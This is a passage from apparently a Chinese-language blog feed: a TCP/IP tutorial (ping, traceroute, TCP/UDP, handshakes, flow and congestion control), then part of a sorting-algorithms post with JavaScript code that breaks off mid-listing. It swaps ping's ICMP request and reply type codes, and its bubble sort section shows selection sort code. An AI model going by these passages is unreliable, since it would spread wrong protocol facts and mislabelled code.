title="ping"></a>ping</h3><p>ping可以说是ICMP的最著名的应用，是TCP/IP协议的一部分。利用“ping”命令可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障。</p><p>例如：当我们某一个网站上不去的时候。通常会ping一下这个网站。ping会回显出一些有用的信息。一般的信息如下:</p><img src="/2018/08/01/2018-08-01-TCPIP协议栈/pic7.jpeg"><p>ping这个单词源自声纳定位，而这个程序的作用也确实如此，它利用ICMP协议包来侦测另一个主机是否可达。原理是用类型码为0的ICMP发请 求，受到请求的主机则用类型码为8的ICMP回应。</p><p>ping程序来计算间隔时间，并计算有多少个包被送达。用户就可以判断网络大致的情况。我们可以看到， ping给出来了传送的时间和TTL的数据。</p><h3 id="Traceroute"><a href="#Traceroute" class="headerlink" title="Traceroute"></a>Traceroute</h3><p>Traceroute是用来侦测主机到目的主机之间所经路由情况的重要工具，也是最便利的工具。</p><p>Traceroute的原理是非常非常的有意思，它收到到目的主机的IP后，首先给目的主机发送一个TTL=1的UDP数据包，而经过的第一个路由器收到这个数据包以后，就自动把TTL减1，而TTL变为0以后，路由器就把这个包给抛弃了，并同时产生 一个主机不可达的ICMP数据报给主机。主机收到这个数据报以后再发一个TTL=2的UDP数据报给目的主机，然后刺激第二个路由器给主机发ICMP数据 报。如此往复直到到达目的主机。这样，traceroute就拿到了所有的路由器IP。</p><img src="/2018/08/01/2018-08-01-TCPIP协议栈/pic8.jpeg"><h3 id="TCP-UDP"><a href="#TCP-UDP" class="headerlink" title="TCP/UDP"></a>TCP/UDP</h3><p>TCP/UDP都是是传输层协议，但是两者具有不同的特性，同时也具有不同的应用场景，下面以图表的形式对比分析。</p><table><thead><tr><th></th><th align="left">TCP</th><th align="left">UDP</th></tr></thead><tbody><tr><td>可靠性</td><td align="left">可靠</td><td align="left">不可靠</td></tr><tr><td>连接性</td><td align="left">面向连接</td><td align="left">无连接</td></tr><tr><td>报文</td><td align="left">面向字节流</td><td align="left">面向报文</td></tr><tr><td>效率</td><td align="left">传输效率低</td><td align="left">传输效率高</td></tr><tr><td>双工性</td><td align="left">全双工</td><td align="left">一对一、一对多、多对一、多对多</td></tr><tr><td>流量控制</td><td align="left">滑动窗口</td><td align="left">无</td></tr><tr><td>拥塞控制</td><td align="left">慢开始、拥塞避免、快重传、快恢复</td><td align="left">无</td></tr><tr><td>传输速度</td><td align="left">慢</td><td align="left">快</td></tr><tr><td>应用场景</td><td align="left">对效率要求低，对准确性要求高或者要求有连接的场景</td><td align="left">对效率要求高，对准确性要求低</td></tr></tbody></table><h4 id="面向报文"><a href="#面向报文" class="headerlink" title="面向报文"></a>面向报文</h4><p>面向报文的传输方式是应用层交给UDP多长的报文，UDP就照样发送，即一次发送一个报文。因此，应用程序必须选择合适大小的报文。若报文太长，则IP层需要分片，降低效率。若太短，会是IP太小。</p><h4 id="面向字节流"><a href="#面向字节流" class="headerlink" title="面向字节流"></a>面向字节流</h4><p>面向字节流的话，虽然应用程序和TCP的交互是一次一个数据块（大小不等），但TCP把应用程序看成是一连串的无结构的字节流。TCP有一个缓冲，当应用程序传送的数据块太长，TCP就可以把它划分短一些再传送。</p><p>关于拥塞控制，流量控制，是TCP的重点，后面讲解。</p><p>TCP和UDP协议的一些应用：</p><table><thead><tr><th>应用层协议</th><th>应用</th><th>传输层协议</th></tr></thead><tbody><tr><td>SMTP</td><td>电子邮件</td><td>TCP</td></tr><tr><td>TELNET</td><td>远程终端接入</td><td>TCP</td></tr><tr><td>HTTP</td><td>万维网</td><td>TCP</td></tr><tr><td>FTP</td><td>文件传输</td><td>TCP</td></tr><tr><td>DNS</td><td>域名转换</td><td>UDP</td></tr><tr><td>TFTP</td><td>文件传输</td><td>UDP</td></tr><tr><td>SNMP</td><td>网络管理</td><td>UDP</td></tr><tr><td>NFS</td><td>远程文件服务器</td><td>UDP</td></tr></tbody></table><h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h4><p><strong>什么时候应该使用TCP？</strong></p><p>当对网络通讯质量有要求的时候，比如：整个数据要准确无误的传递给对方，这往往用于一些要求可靠的应用，比如HTTP、HTTPS、FTP等传输文件的协议，POP、SMTP等邮件传输的协议。</p><p><strong>什么时候应该使用UDP？</strong></p><p>当对网络通讯质量要求不高的时候，要求网络通讯速度能尽量的快，这时就可以使用UDP。</p><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>DNS（Domain Name System，域名系统），因特网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过主机名，最终得到该主机名对应的IP地址的过程叫做域名解析（或主机名解析）。DNS协议运行在UDP协议之上，使用端口号53。</p><h3 id="TCP连接的建立与终止"><a href="#TCP连接的建立与终止" class="headerlink" title="TCP连接的建立与终止"></a>TCP连接的建立与终止</h3><h4 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h4><h5 id="握手过程"><a href="#握手过程" class="headerlink" title="握手过程"></a>握手过程</h5><p>TCP是面向连接的，无论哪一方向另一方发送数据之前，都必须先在双方之间建立一条连接。在TCP/IP协议中，TCP协议提供可靠的连接服务，连接是通过三次握手进行初始化的。三次握手的目的是同步连接双方的序列号和确认号并交换 TCP窗口大小信息。</p><img src="/2018/08/01/2018-08-01-TCPIP协议栈/pic9.jpeg"><p>第一次握手： 建立连接。客户端发送连接请求报文段，将SYN位置为1，Sequence Number为x；然后，客户端进入SYN_SEND状态，等待服务器的确认；</p><p>第二次握手： 服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为x+1(Sequence Number+1)；同时，自己自己还要发送SYN请求信息，将SYN位置为1，Sequence Number为y；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RECV状态；</p><p>第三次握手： 客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为y+1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</p><h5 id="为什么要三次握手？"><a href="#为什么要三次握手？" class="headerlink" title="为什么要三次握手？"></a>为什么要三次握手？</h5><p>为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误。</p><p>具体例子：“已失效的连接请求报文段”的产生在这样一种情况下：client发出的第一个连接请求报文段并没有丢失，而是在某个网络结点长时间的滞留了，以致延误到连接释放以后的某个时间才到达server。本来这是一个早已失效的报文段。但server收到此失效的连接请求报文段后，就误认为是client再次发出的一个新的连接请求。于是就向client发出确认报文段，同意建立连接。假设不采用“三次握手”，那么只要server发出确认，新的连接就建立了。由于现在client并没有发出建立连接的请求，因此不会理睬server的确认，也不会向server发送数据。但server却以为新的运输连接已经建立，并一直等待client发来数据。这样，server的很多资源就白白浪费掉了。采用“三次握手”的办法可以防止上述现象发生。例如刚才那种情况，client不会向server的确认发出确认。server由于收不到确认，就知道client并没有要求建立连接。”</p><h4 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h4><h5 id="挥手过程"><a href="#挥手过程" class="headerlink" title="挥手过程"></a>挥手过程</h5><p>当客户端和服务器通过三次握手建立了TCP连接以后，当数据传送完毕，肯定是要断开TCP连接的啊。那对于TCP的断开连接，这里就有了神秘的“四次分手”。</p><img src="/2018/08/01/2018-08-01-TCPIP协议栈/pic10.jpeg"><p>第一次挥手： 主机1（可以使客户端，也可以是服务器端），设置Sequence Number，向主机2发送一个FIN报文段；此时，主机1进入FIN_WAIT_1状态；这表示主机1没有数据要发送给主机2了；</p><p>第二次挥手： 主机2收到了主机1发送的FIN报文段，向主机1回一个ACK报文段，Acknowledgment Number为Sequence Number加1；主机1进入FIN_WAIT_2状态；主机2告诉主机1，我“同意”你的关闭请求；</p><p>第三次挥手： 主机2向主机1发送FIN报文段，请求关闭连接，同时主机2进入LAST_ACK状态；</p><p>第四次挥手： 主机1收到主机2发送的FIN报文段，向主机2发送ACK报文段，然后主机1进入TIME_WAIT状态；主机2收到主机1的ACK报文段以后，就关闭连接；此时，主机1等待2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，主机1也可以关闭连接了。</p><h5 id="为什么要四次分手？"><a href="#为什么要四次分手？" class="headerlink" title="为什么要四次分手？"></a>为什么要四次分手？</h5><p>TCP协议是一种面向连接的、可靠的、基于字节流的运输层通信协议。TCP是全双工模式，这就意味着，当主机1发出FIN报文段时，只是表示主机1已经没有数据要发送了，主机1告诉主机2，它的数据已经全部发送完毕了；但是，这个时候主机1还是可以接受来自主机2的数据；当主机2返回ACK报文段时，表示它已经知道主机1没有数据发送了，但是主机2还是可以发送数据到主机1的；当主机2也发送了FIN报文段时，这个时候就表示主机2也没有数据要发送了，就会告诉主机1，我也没有数据要发送了，之后彼此就会愉快的中断这次TCP连接。</p><h5 id="为什么要等待2MSL？"><a href="#为什么要等待2MSL？" class="headerlink" title="为什么要等待2MSL？"></a>为什么要等待2MSL？</h5><p>MSL：报文段最大生存时间，它是任何报文段被丢弃前在网络内的最长时间。</p><p>原因有二：</p><ul><li>保证TCP协议的全双工连接能够可靠关闭</li><li>保证这次连接的重复数据段从网络中消失</li></ul><p>第一点：如果主机1直接CLOSED了，那么由于IP协议的不可靠性或者是其它网络原因，导致主机2没有收到主机1最后回复的ACK。那么主机2就会在超时之后继续发送FIN，此时由于主机1已经CLOSED了，就找不到与重发的FIN对应的连接。所以，主机1不是直接进入CLOSED，而是要保持TIME_WAIT，当再次收到FIN的时候，能够保证对方收到ACK，最后正确的关闭连接。</p><p>第二点：如果主机1直接CLOSED，然后又再向主机2发起一个新连接，我们不能保证这个新连接与刚关闭的连接的端口号是不同的。也就是说有可能新连接和老连接的端口号是相同的。一般来说不会发生什么问题，但是还是有特殊情况出现：假设新连接和已经关闭的老连接端口号是一样的，如果前一次连接的某些数据仍然滞留在网络中，这些延迟数据在建立新连接之后才到达主机2，由于新连接和老连接的端口号是一样的，TCP协议就认为那个延迟的数据是属于新连接的，这样就和真正的新连接的数据包发生混淆了。所以TCP连接还要在TIME_WAIT状态等待2倍MSL，这样可以保证本次连接的所有数据都从网络中消失。</p><h3 id="TCP流量控制"><a href="#TCP流量控制" class="headerlink" title="TCP流量控制"></a>TCP流量控制</h3><p>如果发送方把数据发送得过快，接收方可能会来不及接收，这就会造成数据的丢失。所谓流量控制就是让发送方的发送速率不要太快，要让接收方来得及接收。</p><p>利用滑动窗口机制可以很方便地在TCP连接上实现对发送方的流量控制。</p><p>设A向B发送数据。在连接建立时，B告诉了A：“我的接收窗口是 rwnd = 400 ”(这里的 rwnd 表示 receiver window) 。因此，发送方的发送窗口不能超过接收方给出的接收窗口的数值。请注意，TCP的窗口单位是字节，不是报文段。假设每一个报文段为100字节长，而数据报文段序号的初始值设为1。大写ACK表示首部中的确认位ACK，小写ack表示确认字段的值ack。</p><img src="/2018/08/01/2018-08-01-TCPIP协议栈/pic11.jpeg"><p>从图中可以看出，B进行了三次流量控制。第一次把窗口减少到 rwnd = 300 ，第二次又减到了 rwnd = 100 ，最后减到 rwnd = 0 ，即不允许发送方再发送数据了。这种使发送方暂停发送的状态将持续到主机B重新发出一个新的窗口值为止。B向A发送的三个报文段都设置了 ACK = 1 ，只有在ACK=1时确认号字段才有意义。</p><p>TCP为每一个连接设有一个持续计时器(persistence timer)。只要TCP连接的一方收到对方的零窗口通知，就启动持续计时器。若持续计时器设置的时间到期，就发送一个零窗口控测报文段（携1字节的数据），那么收到这个报文段的一方就重新设置持续计时器。</p><h3 id="TCP拥塞控制"><a href="#TCP拥塞控制" class="headerlink" title="TCP拥塞控制"></a>TCP拥塞控制</h3><h4 id="慢开始和拥塞避免"><a href="#慢开始和拥塞避免" class="headerlink" title="慢开始和拥塞避免"></a>慢开始和拥塞避免</h4><p>发送方维持一个拥塞窗口 cwnd ( congestion window )的状态变量。拥塞窗口的大小取决于网络的拥塞程度，并且动态地在变化。发送方让自己的发送窗口等于拥塞窗口。</p><p>发送方控制拥塞窗口的原则是：只要网络没有出现拥塞，拥塞窗口就再增大一些，以便把更多的分组发送出去。但只要网络出现拥塞，拥塞窗口就减小一些，以减少注入到网络中的分组数。</p><h5 id="慢开始算法"><a href="#慢开始算法" class="headerlink" title="慢开始算法"></a>慢开始算法</h5><p>当主机开始发送数据时，如果立即所大量数据字节注入到网络，那么就有可能引起网络拥塞，因为现在并不清楚网络的负荷情况。</p><p>因此，较好的方法是 先探测一下，即由小到大逐渐增大发送窗口，也就是说，由小到大逐渐增大拥塞窗口数值。</p><p>通常在刚刚开始发送报文段时，先把拥塞窗口 cwnd 设置为一个最大报文段MSS的数值。而在每收到一个对新的报文段的确认后，把拥塞窗口增加至多一个MSS的数值。用这样的方法逐步增大发送方的拥塞窗口 cwnd ，可以使分组注入到网络的速率更加合理。</p><img src="/2018/08/01/2018-08-01-TCPIP协议栈/pic12.jpeg"><p>每经过一个传输轮次，拥塞窗口 cwnd 就加倍。一个传输轮次所经历的时间其实就是往返时间RTT。不过“传输轮次”更加强调：把拥塞窗口cwnd所允许发送的报文段都连续发送出去，并收到了对已发送的最后一个字节的确认。</p><p>另，慢开始的“慢”并不是指cwnd的增长速率慢，而是指在TCP开始发送报文段时先设置cwnd=1，使得发送方在开始时只发送一个报文段（目的是试探一下网络的拥塞情况），然后再逐渐增大cwnd。</p><p>为了防止拥塞窗口cwnd增长过大引起网络拥塞，还需要设置一个慢开始门限ssthresh状态变量。慢开始门限ssthresh的用法如下：</p><ul><li>当 cwnd &lt; ssthresh 时，使用上述的慢开始算法。</li><li>当 cwnd &gt; ssthresh 时，停止使用慢开始算法而改用拥塞避免算法。</li><li>当 cwnd = ssthresh 时，既可使用慢开始算法，也可使用拥塞控制避免算法。</li></ul><h5 id="拥塞避免"><a href="#拥塞避免" class="headerlink" title="拥塞避免"></a>拥塞避免</h5><p>让拥塞窗口cwnd缓慢地增大，即每经过一个往返时间RTT就把发送方的拥塞窗口cwnd加1，而不是加倍。这样拥塞窗口cwnd按线性规律缓慢增长，比慢开始算法的拥塞窗口增长速率缓慢得多。</p><img src="/2018/08/01/2018-08-01-TCPIP协议栈/pic13.jpeg"><p>无论在慢开始阶段还是在拥塞避免阶段，只要发送方判断网络出现拥塞（其根据就是没有收到确认），就要把慢开始门限ssthresh设置为出现拥塞时的发送 方窗口值的一半（但不能小于2）。然后把拥塞窗口cwnd重新设置为1，执行慢开始算法。</p><p>这样做的目的就是要迅速减少主机发送到网络中的分组数，使得发生 拥塞的路由器有足够时间把队列中积压的分组处理完毕。</p><p>如下图，用具体数值说明了上述拥塞控制的过程。现在发送窗口的大小和拥塞窗口一样大。</p><img src="/2018/08/01/2018-08-01-TCPIP协议栈/pic14.jpeg"><h4 id="快重传和快恢复"><a href="#快重传和快恢复" class="headerlink" title="快重传和快恢复"></a>快重传和快恢复</h4><h5 id="快重传"><a href="#快重传" class="headerlink" title="快重传"></a>快重传</h5><p>快重传算法首先要求接收方每收到一个失序的报文段后就立即发出重复确认（为的是使发送方及早知道有报文段没有到达对方）而不要等到自己发送数据时才进行捎带确认。</p><img src="/2018/08/01/2018-08-01-TCPIP协议栈/pic15.jpeg"><p>接收方收到了M1和M2后都分别发出了确认。现在假定接收方没有收到M3但接着收到了M4。</p><p>显然，接收方不能确认M4，因为M4是收到的失序报文段。根据 可靠传输原理，接收方可以什么都不做，也可以在适当时机发送一次对M2的确认。</p><p>但按照快重传算法的规定，接收方应及时发送对M2的重复确认，这样做可以让 发送方及早知道报文段M3没有到达接收方。发送方接着发送了M5和M6。接收方收到这两个报文后，也还要再次发出对M2的重复确认。这样，发送方共收到了 接收方的四个对M2的确认，其中后三个都是重复确认。</p><p>快重传算法还规定，发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段M3，而不必 继续等待M3设置的重传计时器到期。</p><p>由于发送方尽早重传未被确认的报文段，因此采用快重传后可以使整个网络吞吐量提高约20%。</p><h5 id="快恢复"><a href="#快恢复" class="headerlink" title="快恢复"></a>快恢复</h5><p>与快重传配合使用的还有快恢复算法，其过程有以下两个要点：</p><ul><li>当发送方连续收到三个重复确认，就执行“乘法减小”算法，把慢开始门限ssthresh减半。</li><li>与慢开始不同之处是现在不执行慢开始算法（即拥塞窗口cwnd现在不设置为1），而是把cwnd值设置为 慢开始门限ssthresh减半后的数值，然后开始执行拥塞避免算法（“加法增大”），使拥塞窗口缓慢地线性增大。</li></ul><img src="/2018/08/01/2018-08-01-TCPIP协议栈/pic16.jpeg">]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 计算机网络 </tag>
            
            <tag> TCP/UDP </tag>
            
            <tag> TCP/IP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十大排序算法</title>
      <link href="/2018/07/21/2018-07-21-%E5%8D%81%E5%A4%A7%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
      <url>/2018/07/21/2018-07-21-%E5%8D%81%E5%A4%A7%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 排序也是常用的基本运算 <i class="fa fa-quote-right"></i></p><a id="more"></a><h2 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h2><h3 id="算法分类"><a href="#算法分类" class="headerlink" title="算法分类"></a>算法分类</h3><p>十种常见排序算法可以分为两大类：</p><ul><li><strong>比较类排序</strong>：通过比较来决定元素间的相对次序，由于其时间复杂度不能突破O(nlogn)，因此也称为非线性时间比较类排序。</li><li><strong>非比较类排序</strong>：不通过比较来决定元素间的相对次序，它可以突破基于比较排序的时间下界，以线性时间运行，因此也称为线性时间非比较类排序。 </li></ul><img src="/2018/07/21/2018-07-21-十大排序算法/pic1.png"><h3 id="算法复杂度"><a href="#算法复杂度" class="headerlink" title="算法复杂度"></a>算法复杂度</h3><table><thead><tr><th>排序方法</th><th>时间复杂度（平均）</th><th>时间复杂度（最坏）</th><th>时间复杂度（最好）</th><th>空间复杂度</th><th>稳定性</th></tr></thead><tbody><tr><td>插入排序</td><td><em>O(n<sup>2</sup>)</em></td><td><em>O(n<sup>2</sup>)</em></td><td><em>O(n)</em></td><td><em>O(1)</em></td><td>稳定</td></tr><tr><td>希尔排序</td><td><em>O(n<sup>1.3</sup>)</em></td><td><em>O(n<sup>2</sup>)</em></td><td><em>O(n)</em></td><td><em>O(1)</em></td><td>不稳定</td></tr><tr><td>选择排序</td><td><em>O(n<sup>2</sup>)</em></td><td><em>O(n<sup>2</sup>)</em></td><td><em>O(n<sup>2</sup>)</em></td><td><em>O(1)</em></td><td>不稳定</td></tr><tr><td>堆排序</td><td><em>O(nlog<sub>2</sub>n)</em></td><td><em>O(nlog<sub>2</sub>n)</em></td><td><em>O(nlog<sub>2</sub>n)</em></td><td><em>O(1)</em></td><td>不稳定</td></tr><tr><td>冒泡排序</td><td><em>O(n<sup>2</sup>)</em></td><td><em>O(n<sup>2</sup>)</em></td><td><em>O(n)</em></td><td><em>O(1)</em></td><td>稳定</td></tr><tr><td>快速排序</td><td><em>O(nlog<sub>2</sub>n)</em></td><td><em>O(n<sup>2</sup>)</em></td><td><em>O(nlog<sub>2</sub>n)</em></td><td><em>O(nlog<sub>2</sub>n)</em></td><td>不稳定</td></tr><tr><td>归并排序</td><td><em>O(nlog<sub>2</sub>n)</em></td><td><em>O(nlog<sub>2</sub>n)</em></td><td><em>O(nlog<sub>2</sub>n)</em></td><td><em>O(n)</em></td><td>稳定</td></tr><tr><td>计数排序</td><td><em>O(n+k)</em></td><td><em>O(n+k)</em></td><td><em>O(n+k)</em></td><td><em>O(n+k)</em></td><td>稳定</td></tr><tr><td>桶排序</td><td><em>O(n+k)</em></td><td><em>O(n<sup>2</sup>)</em></td><td><em>O(n)</em></td><td><em>O(n+k)</em></td><td>稳定</td></tr><tr><td>基数排序</td><td><i>O(n*k)</i></td><td><i>O(n*k)</i></td><td><i>O(n*k)</i></td><td><em>O(n+k)</em></td><td>稳定</td></tr></tbody></table><ul><li><strong>稳定</strong>：如果a原本在b前面，而a=b，排序之后a仍然在b的前面。</li><li><strong>不稳定</strong>：如果a原本在b的前面，而a=b，排序之后 a 可能会出现在 b 的后面。</li><li><strong>时间复杂度</strong>：对排序数据的总的操作次数。反映当n变化时，操作次数呈现什么规律。</li><li><strong>空间复杂度：</strong>是指算法在计算机内执行时所需存储空间的度量，它也是数据规模n的函数。 </li></ul><h2 id="十大排序算法"><a href="#十大排序算法" class="headerlink" title="十大排序算法"></a>十大排序算法</h2><h3 id="冒泡排序（Bubble-Sort）"><a href="#冒泡排序（Bubble-Sort）" class="headerlink" title="冒泡排序（Bubble Sort）"></a>冒泡排序（Bubble Sort）</h3><p>冒泡排序是一种简单的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果它们的顺序错误就把它们交换过来。走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。 </p><p><strong>算法描述:</strong></p><ul><li>比较相邻的元素。如果第一个比第二个大，就交换它们两个；</li><li>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对，这样在最后的元素应该会是最大的数；</li><li>针对所有的元素重复以上的步骤，除了最后一个；</li><li>重复步骤1~3，直到排序完成。</li></ul><p><strong>动图演示:</strong></p><img src="/2018/07/21/2018-07-21-十大排序算法/pic2.gif"><p><strong>代码演示:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectionSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> len = arr.length;</span><br><span class="line">    <span class="keyword">var</span> minIndex, temp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        minIndex = i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; len; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &lt; arr[minIndex]) &#123;     <span class="comment">// 寻找最小的数</span></span><br><span class="line">                minIndex = j;                 <span class="comment">// 将最小数的索引保存</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        temp = arr[i];</span><br><span class="line">        arr[i] = arr[minIndex];</span><br><span class="line">        arr[minIndex] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>算法分析:</strong></p><p>表现最稳定的排序算法之一，因为无论什么数据进去都是O(n2)的时间复杂度，所以用到它的时候，数据规模越小越好。唯一的好处可能就是不占用额外的内存空间了吧。理论上讲，选择排序可能也是平时排序一般人想到的最多的排序方法了吧。</p><h3 id="选择排序（Selection-Sort）"><a href="#选择排序（Selection-Sort）" class="headerlink" title="选择排序（Selection Sort）"></a>选择排序（Selection Sort）</h3><p>选择排序(Selection-sort)是一种简单直观的排序算法。它的工作原理：首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。 </p><p><strong>算法描述:</strong></p><p>n个记录的直接选择排序可经过n-1趟直接选择排序得到有序结果。具体算法描述如下：</p><ul><li>初始状态：无序区为R[1..n]，有序区为空；</li><li>第i趟排序(i=1,2,3…n-1)开始时，当前有序区和无序区分别为R[1..i-1]和R(i..n）。该趟排序从当前无序区中-选出关键字最小的记录 R[k]，将它与无序区的第1个记录R交换，使R[1..i]和R[i+1..n)分别变为记录个数增加1个的新有序区和记录个数减少1个的新无序区；</li><li>n-1趟结束，数组有序化了。</li></ul><p><strong>动图演示:</strong></p><img src="/2018/07/21/2018-07-21-十大排序算法/pic1.gif"><p><strong>代码实现:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectionSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> len = arr.length;</span><br><span class="line">    <span class="keyword">var</span> minIndex, temp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        minIndex = i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; len; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &lt; arr[minIndex]) &#123;     <span class="comment">// 寻找最小的数</span></span><br><span class="line">                minIndex = j;                 <span class="comment">// 将最小数的索引保存</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        temp = arr[i];</span><br><span class="line">        arr[i] = arr[minIndex];</span><br><span class="line">        arr[minIndex] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插入排序（Insertion-Sort）"><a href="#插入排序（Insertion-Sort）" class="headerlink" title="插入排序（Insertion Sort）"></a>插入排序（Insertion Sort）</h3><p>插入排序（Insertion-Sort）的算法描述是一种简单直观的排序算法。它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。</p><p><strong>算法描述:</strong></p><p>一般来说，插入排序都采用in-place在数组上实现。具体算法描述如下：</p><ul><li>从第一个元素开始，该元素可以认为已经被排序；</li><li>取出下一个元素，在已经排序的元素序列中从后向前扫描；</li><li>如果该元素（已排序）大于新元素，将该元素移到下一位置；</li><li>重复步骤3，直到找到已排序的元素小于或者等于新元素的位置；</li><li>将新元素插入到该位置后；</li><li>重复步骤2~5。</li></ul><p><strong>动图演示:</strong></p><img src="/2018/07/21/2018-07-21-十大排序算法/pic3.gif"><p><strong>代码实现:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertionSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> len = arr.length;</span><br><span class="line">    <span class="keyword">var</span> preIndex, current;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">        preIndex = i - <span class="number">1</span>;</span><br><span class="line">        current = arr[i];</span><br><span class="line">        <span class="keyword">while</span> (preIndex &gt;= <span class="number">0</span> &amp;&amp; arr[preIndex] &gt; current) &#123;</span><br><span class="line">            arr[preIndex + <span class="number">1</span>] = arr[preIndex];</span><br><span class="line">            preIndex--;</span><br><span class="line">        &#125;</span><br><span class="line">        arr[preIndex + <span class="number">1</span>] = current;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>算法分析:</strong></p><p>插入排序在实现上，通常采用in-place排序（即只需用到O(1)的额外空间的排序），因而在从后向前扫描过程中，需要反复把已排序元素逐步向后挪位，为最新元素提供插入空间。</p><h3 id="希尔排序（Shell-Sort）"><a href="#希尔排序（Shell-Sort）" class="headerlink" title="希尔排序（Shell Sort）"></a>希尔排序（Shell Sort）</h3><p>1959年Shell发明，第一个突破O(n2)的排序算法，是简单插入排序的改进版。它与插入排序的不同之处在于，它会优先比较距离较远的元素。希尔排序又叫<strong>缩小增量排序</strong>。</p><p><strong>算法描述:</strong></p><p>先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，具体算法描述：</p><ul><li>选择一个增量序列t1，t2，…，tk，其中ti&gt;tj，tk=1；</li><li>按增量序列个数k，对序列进行k 趟排序；</li><li>每趟排序，根据对应的增量ti，将待排序列分割成若干长度为m 的子序列，分别对各子表进行直接插入排序。仅增量因子为1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。</li></ul><p><strong>动图演示:</strong></p><img src="/2018/07/21/2018-07-21-十大排序算法/pic4.gif"><p><strong>代码实现:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span 